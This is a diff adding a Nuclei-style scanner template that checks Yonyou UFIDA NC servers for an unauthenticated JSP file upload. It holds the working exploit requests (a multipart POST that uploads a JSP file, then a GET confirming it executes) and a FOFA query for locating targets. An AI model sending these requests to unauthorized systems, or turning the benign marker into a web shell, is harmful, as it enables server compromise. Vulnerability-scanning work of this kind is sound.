@@ -1,0 +1,49 @@
+id: yonyou-nc-grouptemplet-fileupload
+
+info:
+  name: UFIDA NC Grouptemplet Interface - Unauthenticated File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    The UFIDA NC Grouptemplet Interface permits unauthenticated users to upload potentially malicious files.
+  reference:
+    - https://www.seebug.org/vuldb/ssvid-99547
+    - https://github.com/Augensternyu/POC-bomber/blob/main/pocs/redteam/yongyou_nc_fileupload_2022.py
+  classification:
+    cpe: cpe:2.3:a:yonyou:ufida-nc:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="用友-UFIDA-NC
+    product: ufida-nc
+    vendor: yonyou
+  tags: yonyou,intrusive,ufida,fileupload
+
+variables:
+  v1: "{{rand_int(1,100)}}"
+
+http:
+  - raw:
+      - |
+        POST /uapim/upload/grouptemplet?groupid={{v1}}&fileType=jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-type: multipart/form-data; boundary=----------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
+
+        ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7
+        Content-Disposition: form-data; name="upload"; filename="{{randstr_1}}.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.println("{{randstr_2}}");%>
+        ------------Ef1KM7GI3Ef1ei4Ij5ae0KM7cH2KM7--
+      - |
+        GET /uapim/static/pages/{{v1}}/head.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "status_code_2 == 200 && contains(body_2,'{{randstr_2}}')"
+        condition: and
+# digest: 490a00463044022078e95c1123bca0588d01dfb83f96ca5b28a29ff0877b4a0bbd6cad99baa1af37022071c220ff67ca8ab6ac6bcf9dc7ac56ae1139a8528fec3010442852807fec717f:922c64590222798bb761d5b6d8e72950
